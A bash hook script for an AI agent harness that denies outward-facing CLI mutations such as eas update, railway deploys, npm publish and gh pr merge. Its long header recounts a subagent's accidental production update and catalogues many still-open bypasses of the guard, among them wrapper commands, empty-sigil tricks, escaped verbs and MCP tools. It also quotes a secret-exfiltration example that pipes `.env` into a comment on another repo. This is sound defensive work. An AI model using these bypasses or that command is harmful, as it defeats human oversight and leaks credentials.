#!/usr/bin/env bash
# PreToolUse(Bash) — structural deny for outward-facing CLI mutations: eas
# update/publish/submit (incl. mutating update:*/channel:*/branch:* colon
# subcommands and `eas build --auto-submit`), mutating railway verbs (incl.
# `railway run` and variable/service/environment sub-subcommands), npm publish,
# this repo's OWN `npm run update:preview|update:production` OTA scripts, and
# mutating gh subcommands (incl. `gh api` with a mutating HTTP method, and any
# gh PR write retargeted at another repo via --repo/-R). Hardens the prose-only
# mitigation in
# docs/solutions/conventions/never-execute-an-outward-facing-cli-fragment-in-review-2026-08-16.md
# after the 2026-08-16 accidental-OTA incident (a subagent ran a real `eas
# update` fragment while probing a PATH-stub hypothesis during a code review).
#
# SCOPE — this hook only sees the Bash tool's `tool_input.command` string. It
# does NOT cover the equivalent MCP tools available in some environments
# (`mcp__github__merge_pull_request`, `mcp__claude_ai_Railway__redeploy`,
# `mcp__claude_ai_Railway__create-deployment`, `mcp__claude_ai_Railway__set-variables`,
# …) — those bypass this hook entirely. The prose rule (code-reviewer.md
# contract + the conventions doc above) remains the only control for those
# paths. This is a Bash-only structural backstop, not a full sandbox — never
# cite it as covering the MCP surface.
#
# COMMAND-POSITION ANCHORS ARE GUARD-LOCAL. This hook uses its OWN
# `_OUT_POS_PREFIX`/`_OUT_POS_SUFFIX`, which STARTED (review round 3,
# 2026-08-16) as a deliberately widened fork of lib/cmd-detect.sh's
# `_CMD_POS_PREFIX`/`_CMD_POS_SUFFIX`. Both sides have since evolved
# independently, so "deliberately WIDER" no longer holds across the board:
#   * suffix — the lib's `_CMD_POS_SUFFIX` was narrower at review round 3
#     (`([[:space:]]|[)]|$)`, missing `;`/`&`/`|`, never matching a verb that
#     is the TERMINAL token of its clause — `npm publish;`, `eas update;`,
#     `railway up&`, `eas update|cat` and `gh pr merge;` were all ALLOWED,
#     which is why this hook forked its own widened `_OUT_POS_SUFFIX`), but
#     the lib has since grown PAST it in four closers: `{`, `}`, `<`, `>`.
#     All four are now fixed here too: `{`/`}` are a LIVE bypass, not the
#     cosmetic gap an earlier version of this comment claimed — a COMMA-form
#     brace span glued to a verb (`merge{,x}`) is real bash brace EXPANSION
#     and places a standalone `merge` token in command position; a NO-comma/
#     NO-range span (`merge{x}`) genuinely stays one word and was never the
#     issue. `_OUT_POS_SUFFIX` now includes `{`/`}` (fixed 2026-09-02, see
#     the "2026-09-02 FIX" regression test in test-guard-outward-cli.sh). The
#     remaining two, `<`/`>`, are REAL redirect operators whose absence here
#     was ALSO a live, confirmed bypass — FIXED 2026-09-05
#     (outward-CLI-guard-folded-repair, finding A; see the full breakdown at
#     this file's `gh pr merge` CLAUSE= assignment below, search
#     `_OUT_POS_SUFFIX` past the occurrence-count check). `_OUT_POS_SUFFIX`
#     is now byte-identical to the lib's `_CMD_POS_SUFFIX`;
#   * prefix — opener class (backtick, `{`, `!`) is now IDENTICAL between the
#     two. The lib's redirect-absorption alternative (`_CMD_REDIR`, added
#     2026-09-01) was the one remaining guard-local GAP — a leading
#     `2>/dev/null`-shaped prefix before the verb was invisible to this
#     hook's own `_OUT_POS_PREFIX` — FIXED 2026-09-05
#     (outward-CLI-guard-folded-repair, finding B): `_OUT_POS_PREFIX` now
#     carries the same `_CMD_REDIR` alternative, referenced by variable, not
#     duplicated as a second literal pattern (`_OUT_POS_PREFIX`'s own
#     definition was relocated to follow the lib source so that reference
#     resolves). What remains guard-local in the OTHER direction —
#     the KEYWORD absorption (`then|do|else|elif|time`) — has no lib
#     equivalent and is not a gap. Full comparison in
#     test-guard-outward-cli.sh's comment above the backtick/brace/keyword
#     assertion block (search "STALE AS OF" there).
# The widening lives HERE, not in lib/cmd-detect.sh, because that lib feeds
# seven hooks (git-safety.sh, core-bare-guard.sh, pr-preflight-guard.sh,
# commit-verify.sh, pr-verify.sh, drift-detect*.sh) whose gates are outside
# this hook's scope contract. Widening an anchor can only ever ADD matches, so
# for THIS deny-only hook it is a strict superset — but for a lib shared with
# gates that *permit* on a match it is not, hence the local copy.
#
# CAVEAT (2026-09-02, round 3) — the "can only ever ADD matches" argument
# above is about the ANCHOR deciding WHETHER a verb is in command position at
# all, and is safe in the DENY-direction: this hook only ever widens toward
# more denies, never grants a carve-out. It does NOT extend automatically to
# what a downstream CLAUSE-CUT does with the text it captures once a match is
# found — the `gh pr merge` CLAUSE= assignment below was a working FALSE
# ALLOW for exactly this reason (a swallowing clause-cut over-captured into
# an unrelated glued-on command's decoy `--auto`), even though the anchor
# widening itself stayed safe. This is a SEPARATE axis from the (now-fixed,
# 2026-09-05) `<`/`>` detection gap disclosed at that same CLAUSE=
# assignment below (search "STRENGTHENED 2026-09-02") — that one was a
# missing boundary character causing total non-detection, not a
# capture-direction issue. See
# the CLAUSE= assignment's own comments and
# docs/solutions/logic-errors/cmd-position-anchor-missed-brace-backtick-bang-boundaries-2026-08-28.md's
# "clause-cut that DECIDES AN ALLOW" section for the full account of both.
#
# ROUND 4 (2026-09-02, independent PR #910 review) — a THIRD, still-open
# gap, same total-non-detection family the (now-fixed) `<`/`>` gap above was
# in, but a different trigger, and NOT closed by the 2026-09-05 `<`/`>` fix
# (nor by the same date's finding-B leading-redirect-absorption fix — a
# DIFFERENT axis, closed at `_OUT_POS_PREFIX`'s own definition): neither
# _OUT_POS_SUFFIX nor _OUT_POS_PREFIX
# nor _OUT_POS_SUFFIX_MERGE_CLAUSE treats a bash sigil that
# expands to nothing ($VAR unset, $(...)/${...} empty) as a boundary, even
# though real bash word-splitting collapses it away — `eas update$(true)
# --branch preview` and `gh pr merge 42$UNSET_VAR` are bash-identical to the
# spaced form but silently ALLOWED, verified live with paired deny controls.
# The suffix side looks like one added character; the prefix side is not
# (bash consumes the whole balanced sigil, leaving no single boundary byte to
# match on) — see the solution doc's own "second, distinct still-open gap"
# section for why this is disclosed whole rather than half-fixed. Still a
# human decision, still out of this repair's scope.
#
# MATCHING IS CASE-INSENSITIVE for the command words (`-i` on every verb grep,
# and on the necessary-substring fast path via `nocasematch`). macOS APFS is
# case-insensitive, so `EAS update`, `GH pr merge 42` and `RAILWAY down` all
# resolve to the real binaries; case-sensitive matching ALLOWED every one of
# them (review round 3). FLAG detection (`--admin`, `--repo`/`-R`,
# `--auto-submit`) stays case-SENSITIVE: gh/eas flag parsing is case-sensitive,
# so `--ADMIN` is not a real flag, and a case-insensitive `-R` would false-match
# the `-r` inside `--remove-reviewer`.
#
# `gh pr merge` CARVE-OUT — bare/immediate `gh pr merge` DENIES, but
# `gh pr merge --auto ...` stays ALLOWED (unless `--admin` or `--repo`/`-R` is
# also present — see below): arming GitHub's native auto-merge does not merge
# until required checks pass, on a branch-protected target — it is NOT a
# "nothing happens synchronously" carve-out (on a PR whose required checks have
# already passed, GitHub merges within seconds), it is a "the same gate a human
# would wait for still applies" carve-out. This repo's own sanctioned /todo
# automerge mechanism (scripts/todo-automerge-guard.sh +
# .claude/agents/todo-executor.md Step 10) calls exactly
# `gh pr merge <n> --auto --squash --delete-branch` for guard-eligible PRs.
# Denying that by default would break the pipeline, and todo-executor.md is out
# of this hook's Scope Contract, so the carve-out is done here instead. More
# than one `gh pr merge` occurrence in the same command is ambiguous — DENY
# (the safe direction for a deny gate; mirrors cmd_gh_pr_ref's identical
# multi-occurrence refusal in lib/cmd-detect.sh).
# `--admin` ("use administrator privileges to merge a PR that does not meet
# requirements") contradicts the carve-out's own premise (that branch
# protection still gates the merge) — DENY regardless of --auto when present.
#
# `gh pr create`/`gh pr comment` are deliberately NOT denied — outward but
# routine (this repo's PR-creation and review-request flow uses them; see the
# todo's own Implementation Notes carve-out) — EXCEPT when `--repo`/`-R` is
# present. That flag retargets the write at an ARBITRARY GitHub repository with
# the user's PAT, which is unbounded egress, not routine workflow:
# `gh pr comment --repo other/org --body "$(cat .env)"` was ALLOWED (review
# round 3). lib/cmd-detect.sh:242 already treats `--repo`/`-R` in any spelling
# as disqualifying for the same reason; this follows that precedent. The
# routine flow never passes `--repo`, so the carve-out is unaffected. The same
# applies to `gh pr merge --repo other/org 42 --auto`, which arms auto-merge on
# someone else's PR.
#
# DOCUMENTED RESIDUALS (guardrail, not a sandbox — a determined bypass is
# always possible; ALLOW_OUTWARD_CLI=1 is the intentional escape hatch):
#   * A global flag before the verb (`npm --registry=x publish`, `eas
#     --non-interactive update`) defeats command-position anchoring — same
#     documented class as cmd-detect.sh's own arg-taking-wrapper residual.
#   * `npx eas update` / `npx gh pr merge` are not recognized: `npx` takes an
#     argument, so it is not a zero-arg runner word _OUT_POS_PREFIX skips (by
#     design — see lib/cmd-detect.sh's header). `bunx`/`bun run` likewise.
#   * `eas publish` does not exist in the installed eas-cli (20.1.0 at time of
#     writing) — the pattern is kept anyway per the acceptance criteria's
#     literal wording and to catch an older/different CLI version; a no-op
#     today, not a false sense of coverage.
#   * A verb split across a shell line-continuation (`eas \<newline>update`) IS
#     covered on all three paths as of review round 3 — cmd_bare collapses the
#     backslash+newline to spaces on the precise path, and
#     crude_smells_outward() now normalizes both a real 0x0A byte and the JSON
#     `\n` escape token to a space on the two degraded paths (previously the
#     escape's literal `n` broke the `[^a-zA-Z]+` separator class and grep's
#     line-orientation split the two tokens — both fallbacks ALLOWED every verb
#     family). What is still NOT recognized is a genuinely MULTI-LINE compound
#     (a real newline with no continuation backslash) on the PRECISE path,
#     where grep -E cannot span the newline: that fails toward DENY for
#     `gh pr merge` (the `--auto` carve-out cannot be seen on another line), the
#     safe direction.
#   * `bash -c "…"` / `sh -c '…'` / `eval "…"` / any interpreter `-c` wrapper
#     (also: `timeout 30 eas update`, `sudo railway up`) hides or shifts the
#     outward command out of command position — the wrapper-word case is the
#     same documented arg-taking-wrapper residual as above; the quoted-`-c`
#     case blanks via `cmd_bare` (the same primitive that stops `git commit
#     -m "mentions eas update"` from a false-positive deny) — same accepted
#     residual class as git-safety.sh's own sudo/env/command/xargs/subshell/
#     eval wrapper note.
#   * A command whose ENTIRE text is quoted (`'eas update'`) blanks to nothing
#     under cmd_bare, which the awk-broken detector below cannot distinguish
#     from "the blanking primitive failed" — it therefore routes to the crude
#     smell test and DENIES. Over-denial on a shape no real caller writes; the
#     safe direction.
#   * Absolute/relative-path invocation (`/usr/local/bin/eas update`,
#     `./node_modules/.bin/eas update`) does not match the literal
#     `eas`/`railway`/`npm`/`gh` command word.
#   * `gh workflow run`, `gh secret set`, `gh variable set` and other gh
#     namespaces beyond `pr`/`release`/`repo`/`api` are not covered — the
#     todo scoped this to "verb-scoped, not exhaustive"; `gh api` itself IS
#     covered (mutating -X/--method only) because it can reach the identical
#     `pr merge` action this hook already gates, via a different subcommand.
#   * The eas `update:*` colon namespace is PARTIALLY covered: the mutating
#     forms verified against `eas update --help` (eas-cli 20.1.0) —
#     update:delete, update:edit, update:republish,
#     update:revert-update-rollout, update:roll-back-to-embedded,
#     update:rollback — are denied explicitly below; `update:list`,
#     `update:view`, `update:insights` are the verified-read-only set that
#     stays allowed. An `eas` CLI version that adds a NEW mutating `update:*`
#     subcommand not in this list is not covered until this list is updated.
#     The `channel:`/`branch:` namespaces are covered for the mutating verbs
#     create|edit|delete|rename only (review round 3 found `eas channel:edit`
#     and `eas branch:delete` ALLOWED with effects identical to already-denied
#     commands); their read-only `:list`/`:view` forms stay allowed, and any
#     OTHER `eas` namespace (`eas device:*`, `eas credentials`, `eas env:*`,
#     `eas metadata:push`, …) is explicitly OUT OF SCOPE — not covered.
#     (`gh api -X "POST" …`, a QUOTED HTTP method value, WAS listed here as an
#     accepted residual while the check ran on `$BARE`. It is caught now — the
#     check reads `$WORDS`, where the quote characters are already gone, so
#     `-X "PUT"`, `--method "PUT"` and `-X"PUT"` all read as their unquoted
#     spellings. Pinned in test-guard-outward-cli.sh.)
#   * `npm run update:preview|update:production` IS covered (see below), as are
#     the `yarn`/`pnpm` bare-script equivalents, and — since the _OUT_FLAG_RUN
#     fix — every FLAG spelling between the runner, `run`, and the script name
#     (`-s`, `--silent`, `--flag=value`, and `--flag value` with a
#     space-separated value). `bunx`/a shell alias/`corepack npm run …`/a direct
#     `sh -c "$(node -p 'require("./package.json").scripts["update:preview"]')"`
#     are not.
#   * QUOTED COMMAND WORDS — FIXED 2026-08-16, previously bypassed every check
#     in this file. `cmd_bare` BLANKS quoted spans, but the shell word-splits
#     `eas "update"` and concatenates `eas up"date"` into the argv `eas update`,
#     so the verb was erased before any pattern ran. Every INVOCATION pattern now
#     matches `$WORDS` (lib/cmd-detect.sh's `cmd_words`), which reproduces argv:
#     quote characters deleted, separators inside a span neutralised so
#     `git commit -m "chore; eas update"` still ALLOWS. The two carve-out blocks
#     (`gh pr merge`'s --auto, `gh api`'s method) both DETECT and VERIFY on
#     `$WORDS`: a quoted span is exactly one word there, so a quoted `--auto`
#     decoy (`-b "use --auto next time"`) becomes part of a larger token and
#     still cannot grant the carve-out. An earlier revision counted on both
#     renderings and denied when they disagreed; that was strictly worse, because
#     equal counts never proved the two had found the SAME occurrence.
#     Residual, BACKSLASH forms only: a verb split by a backslash (`e\as
#     update`) or prefixed by one (`\gh pr merge` — the alias-bypass idiom) is
#     still missed, because the renderings hide an escaped character rather than
#     unescaping it. The QUOTED flag forms are covered: quoted flag VALUES
#     (`gh api -X "PUT"`) via the $WORDS clause, and quoted flag NAMES
#     (`--ad"min"`, `--auto-"submit"`) because the two deny-only flag checks scan
#     raw `$CMD` AND `$WORDS`, fed to grep separated by a NEWLINE (never
#     concatenated — the seam would spell flags present in neither). They can only
#     ADD a deny, never grant a carve-out, so reading both renderings is free. Pinned in test-guard-outward-cli.sh under
#     "QUOTED COMMAND WORDS".
#   * SCOPE, stated so it is not inferred: `update:preview`/`update:production`
#     are the only package.json scripts covered. `migrate:images-r2` and
#     `backfill:recipe-images` also mutate production Cloudflare R2 in place
#     (CLAUDE.md notes a real backfill run needs a CDN purge afterwards) and are
#     deliberately NOT covered here.
#   * A verb GLUED TO A REDIRECT, no space required, on EITHER side — two
#     DIFFERENT mechanisms, both LIVE bypasses of this hook as of 2026-09-02,
#     both already closed in the shared lib (commit 33baffea, 2026-09-01):
#       - trailing: a redirect right after the verb (`eas update` + a `<`/
#         `>`) was invisible because `_OUT_POS_SUFFIX`'s closer alternation
#         did not include `<`/`>` as characters — the lib's `_CMD_POS_SUFFIX`
#         did. FIXED 2026-09-05 (outward-CLI-guard-folded-repair, finding A):
#         `_OUT_POS_SUFFIX` now carries `<`/`>` and is byte-identical to
#         `_CMD_POS_SUFFIX`. `_OUT_POS_SUFFIX_MERGE_CLAUSE`'s branch 2 (the
#         positive closer class) also carries `<`/`>`, for the same
#         anchor-closer reason; branch 2 alone is sufficient here because a
#         verb glued directly to a bare redirect (`gh pr merge>log`, no
#         further args) never enters branch 1's capture at all — see the
#         ACCEPTED OVER-DENIAL residual above for why branch 1 does NOT
#         carry `<`/`>` (a ROUND 2 revert, after a CRITICAL bypass). See
#         test-guard-outward-cli.sh's "2026-09-05: finding A" and "... ROUND
#         2" blocks.
#       - leading: a redirect right before the verb (a leading `2>/dev/null`
#         + the verb) was invisible for a DIFFERENT reason — it is not about
#         boundary characters at all: `_OUT_POS_PREFIX`'s absorber run (the
#         part that skips env-assignments and zero-arg runner words before
#         the verb) had no redirect-token alternative, so it could not skip
#         PAST a leading redirect to reach the verb. The lib's
#         `_CMD_POS_PREFIX` gained exactly that alternative (`_CMD_REDIR`, in
#         lib/cmd-detect.sh) on 2026-09-01; this hook's own copy was never
#         given one. FIXED 2026-09-05 (outward-CLI-guard-folded-repair,
#         finding B): `_OUT_POS_PREFIX` now carries the SAME `_CMD_REDIR`
#         alternative, referenced by variable (not a duplicated literal
#         pattern) — which is why the whole "command-position anchors"
#         definition block had to move to follow the lib source further down
#         in this file (interpolating `$_CMD_REDIR` before the lib is sourced
#         would silently resolve to the empty string, no error, bypass
#         open). This also closes a related multi-occurrence undercount:
#         `gh pr merge 42 --auto ; 2>/dev/null gh pr merge 7` used to see
#         only the FIRST occurrence (the second's leading redirect hid it
#         from the count) and ALLOWED on the strength of the first's real
#         `--auto` while the second, --auto-less merge ran unconditionally —
#         now both are counted and the ambiguous-occurrence DENY fires
#         correctly. NEW ACCEPTED OVER-DENIAL as a side effect (deny
#         direction, never a bypass): because the absorbed leading redirect
#         is now part of the `gh pr merge` CLAUSE= capture, a leading
#         redirect that itself contains a `$` (`2>$LOGFILE gh pr merge 42
#         --auto`) trips the existing "any `$` in CLAUSE is unverifiable"
#         guard and denies a real, uncorrupted `--auto` — the same
#         documented over-broad-in-the-safe-direction behavior the CLAUSE=
#         assignment's own comment already discloses for a `$VAR` mention
#         elsewhere in the clause, now also reachable via the prefix.
#         Regression tests in test-guard-outward-cli.sh's "2026-09-05:
#         finding B" block.
#     See the COMMAND-POSITION ANCHORS header above and
#     test-guard-outward-cli.sh's "STALE AS OF 2026-09-02" comment (now
#     updated to reflect the finding-B fix) for the confirmed repro and the
#     full anchor-by-anchor comparison. (A THIRD, related `_OUT_POS_SUFFIX`
#     gap — `{`/`}`, real bash brace expansion, not a redirect — WAS fixed
#     the same review round: see the "2026-09-02 FIX" comment at this file's
#     `gh pr merge` CLAUSE= assignment.)
#   * ACCEPTED OVER-DENIAL (ruled 2026-09-05, outward-CLI-guard-folded-repair
#     finding A, ROUND 2) — a `gh pr merge` clause is DENIED, not allowed,
#     when a real, standalone `--auto` is GLUED directly to a trailing
#     redirect with NO space in between (`gh pr merge 42 --auto>/dev/null`
#     is the canonical shape — real bash argv, once the redirect is
#     stripped, is `pr merge 42 --auto`, a genuine armed automerge that this
#     over-denies). This is the pre-Task-2 behavior, NOT a new gap: it is
#     what `_OUT_POS_SUFFIX_MERGE_CLAUSE` already did before finding A, and
#     is restored here on purpose. A ROUND-1 attempt widened branch 1 (the
#     negated clause-cut class that decides how far the CLAUSE capture
#     runs) to stop at the same `<`/`>` boundary branch 2 uses, which DID
#     allow this glued shape — but a security review found that the SAME
#     widening also truncated the CLAUSE before a LATER `$`-bearing sigil on
#     constructions where a redirect lands between `--auto` and that sigil
#     (`gh pr merge 42 --auto >anyfile ${x:---admin}`), hiding the sigil
#     from the co-mask-c1 unverifiability guard at this file's CLAUSE=
#     assignment and SILENTLY ALLOWING a real administrator-override merge —
#     a live, CRITICAL bypass, not a theoretical one. ROUND 2 reverted
#     branch 1's `<`/`>` addition (branch 2 keeps it — a genuinely different,
#     closer-position role, unaffected by this revert) to close that bypass,
#     accepting this narrower over-denial instead: `<`/`>` are real bash
#     redirects that do not end the CLAUSE the way `;`/`&`/`|` do (bash
#     strips the redirect and keeps reading the words after it as the same
#     invocation), but branch 1's job is "keep capturing the rest of this
#     clause" — teaching it to STOP at a redirect anyway is exactly the
#     tradeoff that reopened the bypass, so it stays narrow. NEVER a bypass:
#     an over-deny here can only cost someone the escape hatch
#     (`ALLOW_OUTWARD_CLI=1`), never grant one. Two OTHER shapes were
#     checked and are UNAFFECTED: the realistic ordering a real user
#     writes, redirect last WITH a space (`gh pr merge 42 --auto
#     >/dev/null`), still correctly ALLOWS — `--auto` is already bounded by
#     real whitespace on both sides before the redirect is ever reached, so
#     branch 1's behavior at the redirect is irrelevant to that shape — and
#     a redirect landing BETWEEN the verb and a later real `--auto`
#     (`gh pr merge >/dev/null 42 --auto`) now correctly ALLOWS too (ROUND
#     1's over-denial on that shape no longer exists after this revert).
#     CANDIDATE IMPROVEMENT, explicitly NOT taken here (out of finding A's
#     scope, which is the closer class, not the grant-shaped `--auto` field
#     scan): keep branch 1 narrow AND teach the `--auto` field scan itself
#     to treat `<`/`>` as token boundaries, which would allow the glued
#     form too while keeping the CLAUSE intact for the `$`-guard. All four
#     constructions pinned in test-guard-outward-cli.sh's "2026-09-05:
#     finding A follow-up, ROUND 2" block, plus a corpus row
#     (`co-redir-mask`); full evidence in task-2-report.md.
#
# Escape: `ALLOW_OUTWARD_CLI=1 <command>` as an INLINE prefix on the one Bash
# command (recognized from the command string itself — see the case
# statement below the CMD extraction for why this differs from an exported
# env var), OR export `ALLOW_OUTWARD_CLI=1` ambiently for the rest of the
# session (broader-scoped; prefer the inline form).
# Tests: .claude/hooks/test-guard-outward-cli.sh
set -uo pipefail

[ -n "${ALLOW_OUTWARD_CLI:-}" ] && exit 0

# COMMAND-POSITION ANCHORS: defined AFTER lib/cmd-detect.sh is sourced (below),
# because _OUT_POS_PREFIX interpolates the lib's $_CMD_REDIR. Defining them here
# would interpolate an UNSET variable to the empty string — no error, suite
# green, bypass open. See the definitions further down.

# Leading boundary for the three DENY-ONLY flag checks (this file's --repo/-R,
# --auto-submit, and --admin scans). Two alternatives:
#   1. `^` or a character that is not part of a flag token — the original class.
#   2. A default-value parameter expansion's operator. Bash's `:-` and bare `-`
#      each consume exactly one literal `-` from the source text and leave the
#      REST of the word as the expansion, so `${x:---repo}` places a literal
#      `-` immediately before a real, functioning two-dash `--repo` — argv
#      genuinely carries the flag, but the original class (which rejects a
#      preceding dash) never matches it (finding C1,
#      outward-CLI-guard-folded-repair, 2026-09-05).
# Alternative 2 covers every bash `${PARAM:-...}`/`${PARAM-...}` PARAM shape
# that (a) is valid syntax immediately before `:-`/bare `-` and (b) can
# plausibly expand via that operator (i.e. PARAM can be unset or null),
# enumerated by grammar, not by the handful of examples an earlier revision
# happened to try — a per-example patch leaves whatever spelling wasn't
# tried:
#   - a NAME (`${x:-`), same as always.
#   - a positional parameter, one or more digits, single- or multi-digit
#     (`${1:-`, `${10:-`) — real bash, verified: unset positional params
#     default exactly like an unset NAME.
#   - indirect expansion, `!` followed by a NAME or a digit sequence
#     (`${!v:-`, `${!1:-`) — verified live: `${!1:-word}` really does fire
#     when $1 is unset, not just `${!v:-word}` for a NAME target.
#   - an array element or the array-KEYS-listing form, either bare or
#     bang-prefixed, with any bracket contents (`${a[0]:-`, `${a[@]:-`,
#     `${!a[@]:-`) — the bracket contents are never inspected; anything
#     without a literal `]` closes it.
#   - the "all positional parameters" specials, `@` and `*` (`${@:-`,
#     `${*:-`) — verified live: these DO default via `:-`/bare `-` when
#     there are zero positional parameters, exactly like a NAME.
#   - bare `!` alone (`${!:-`) — the last-background-PID special parameter,
#     commonly unset (nothing has ever been backgrounded) — DISTINCT from
#     indirect expansion, which needs a NAME/digit after the `!`.
# Deliberately excluded, each verified rather than assumed:
#   - `${?:-`, `${#:-`, `${$:-`, `${-:-` — $?, $#, $$, and $- are each
#     ALWAYS set to a non-empty string (verified: `0`, `0`, a PID, and a
#     flag string respectively, live), so `:-`/bare `-` never fires; none is
#     attacker-controlled either.
#   - `${#x:-` (the LENGTH operator) — not valid bash syntax at all when
#     combined with `:-`/bare `-` (verified: "bad substitution"), so it
#     cannot be swept in regardless of what this alternative matches.
#   - `${!prefix*}`/`${!prefix@}` (the variable-NAME-matching forms) — also
#     not valid bash syntax combined with `:-`/bare `-` (verified: "bad
#     substitution"); excluded structurally, not by omission.
#   - `:+` and `:=` are NOT covered by this alternative at all: `+`/`=`
#     already satisfy alternative 1, so a default-value OR assign-default
#     expansion using either operator already denies today, on every PARAM
#     shape, without needing a PARAM-aware alternative here.
# SAFE ONLY BECAUSE ALL THREE CONSUMERS ARE DENY-SHAPED — an added alternative
# here can only ever ADD a deny, never grant a carve-out. Verified by reading
# the call sites, not assumed: `scan_both`'s own precondition comment restricts
# it to deny-shaped callers, and `gh_pr_clause_has_repo`'s own comment states
# "`--repo`/`-R` only ever ADDS a deny, it never grants a carve-out" — its two
# callers both call `deny()` on a true result and do nothing on false.
# Anchoring the flag match immediately after the consumed operator also keeps
# this precise, not just wider, for every PARAM shape uniformly (not per-form
# special-casing): none of them can consume more than the operator's single
# mandatory `-`, so `${x:----admin}`, `${1:----admin}`, `${!v:----admin}`,
# `${a[0]:----admin}`, `${@:----admin}`, and `${!:----admin}` all leave a
# leftover bare dash before the flag text, which the class still rejects —
# verified live for each, not just the plain-NAME case.
_OUT_FLAG_LEAD='(^|[^-A-Za-z0-9]|\$\{(!([A-Za-z_][A-Za-z0-9_]*|[0-9]+)(\[[^]]*\])?|!|[A-Za-z_][A-Za-z0-9_]*(\[[^]]*\])?|[0-9]+|[@*]):?-)'

# `--repo`/`-R` in any spelling gh's flag parser accepts (`--repo v`,
# `--repo=v`, `"--repo" v`, `-R v`, `-Rv`). Case-SENSITIVE on purpose — see
# the header. Boundary class is "not a word/dash character" (plus the
# default-value-expansion alternative in `_OUT_FLAG_LEAD`) rather than
# strictly whitespace, exactly like the `--admin` check below, so a QUOTED
# flag name is still seen; `--repo`'s trailing boundary keeps a hypothetical
# `--repository` from matching, while `-R` deliberately has none so the glued
# `-Rowner/repo` form is caught.
_OUT_REPO_FLAG_RE="${_OUT_FLAG_LEAD}"'(--repo([^-A-Za-z0-9]|$)|-R)'

# gh_pr_clause_has_repo <subcommand-alternation> → exit 0 if the FIRST
# `gh pr <sub>` clause in $WORDS_DEEP carries --repo/-R.
#
# CLAUSE-SCOPED, unlike the `--admin` check below: `--admin` survives a whole-command
# scan because it is a rare token, but `-R` is `cp -R`, `grep -R`, `ls -R`,
# `rsync -R`. A whole-$CMD scan denied `cp -R src dst && gh pr create --title
# x --body y` — i.e. this repo's own PR-creation pipeline (caught in review
# before it shipped). lib/cmd-detect.sh:242, the precedent this check follows,
# is likewise clause-scoped: it applies the identical regex to `$full_match`,
# never to the whole command.
# The caller has already established from $WORDS that a COMMAND-POSITION
# `gh pr <sub>` exists AND that there is EXACTLY ONE such occurrence — every
# call site denies outright on >1 occurrence before ever reaching this
# function (see GH_PR_MERGE_OCCURRENCES above and GH_PR_CREATE_OCCURRENCES
# below), so `head -1` here only ever sees the single real clause, never
# chooses among several. This was NOT always true for create/comment: an
# earlier revision counted occurrences for merge/api only, leaving `head -1`
# free to silently inspect a benign FIRST create/comment clause while a
# malicious `--repo` clause sat unexamined in a second one — unbounded PAT
# egress (review round 4, 2026-08-17).
# Cuts from $WORDS_DEEP (not raw $CMD) so the clause is found for the SAME
# spellings the caller's occurrence count matches, INCLUDING one hidden inside
# a live command substitution. Left on raw $CMD it silently returned an empty
# clause — and therefore ALLOWED — for `gh pr "create" --repo other/org`,
# unbounded PAT egress to an arbitrary repo (review, 2026-08-16). $WORDS_DEEP
# loses nothing this check needs: quote characters are already deleted, so a
# quoted `"--repo"` or `-R "other/org"` is still visible, while a MENTION
# inside a span collapses to one token (`--title usex--repoxcarefully`) whose
# `--repo` no longer sits at a token boundary and so cannot false-match. Deep,
# not shallow, is SAFE here (unlike the `gh pr merge --auto` CLAUSE below):
# `--repo`/`-R` only ever ADDS a deny, it never grants a carve-out.
gh_pr_clause_has_repo() {
  local clause
  clause=$(printf '%s' "$WORDS_DEEP" | grep -oiE "gh[[:space:]]+pr[[:space:]]+($1)[^;&|]*" | head -1)
  [ -n "$clause" ] && grep -Eq "$_OUT_REPO_FLAG_RE" <<< "$clause"
}

# Crude, non-quote-aware smell test shared by ALL THREE fail-closed fallback
# paths below (no-jq; jq-envelope-unparseable; jq-present-but-lib-unsourceable
# or cmd_bare-broken). Kept in sync with the precise per-predicate patterns
# further down MANUALLY — every verb added to one list must be added to the
# other, or the fallback path is weaker than the precise path. $1 is raw,
# unblanked text (either the whole JSON envelope or an already-extracted
# command string — both are fine, this only greps for substrings).
#
# NEWLINE NORMALIZATION (review round 3): a shell line-continuation split the
# verb from its subcommand and defeated BOTH degraded paths for EVERY verb
# family. Two distinct mechanisms: the no-jq path scans the RAW, still-encoded
# JSON where a newline is the two-character escape `\n` — the literal byte `n`
# is a letter, so it breaks the `[^a-zA-Z]+` separator class; the other paths
# scan a DECODED string containing a real 0x0A, and grep is line-oriented, so
# the two tokens never share a line. Normalize both representations to a space
# BEFORE matching. Pure parameter expansion, NOT `tr`/`sed`: the no-jq path
# runs in an environment where those may be absent (its own test fixture links
# only bash/cat/grep), and depending on a tool that can be missing is precisely
# the bug C4 below fixes. Order matters — `\\n` (the raw envelope's escaped
# backslash + escaped newline) has `\n` as its tail, so the single `\n`
# substitution handles both spellings.
crude_smells_outward() {
  local t=${1//$'\n'/ }
  t=${t//\\n/ }
  # Strip quote/backslash/$ characters (review round 4, 2026-08-17): this is a
  # non-quote-aware smell test by design, but leaving these characters in
  # place let a $-sigil-split verb (`e$'a's update`, which cmd_words itself
  # reconstructs to `eas update`) hide from every regex below, all of which
  # require the verb's letters adjacent. Stripping only ever REMOVES
  # punctuation, never letters, so it can only make this fail-closed check
  # fire MORE often, never less — the safe direction for a fallback that only
  # runs when everything else (jq, awk, or the lib itself) is already broken.
  t=${t//\'/}; t=${t//\"/}; t=${t//\\/}; t=${t//\$/}
  # Command-word patterns — case-INSENSITIVE (macOS APFS resolves `EAS`).
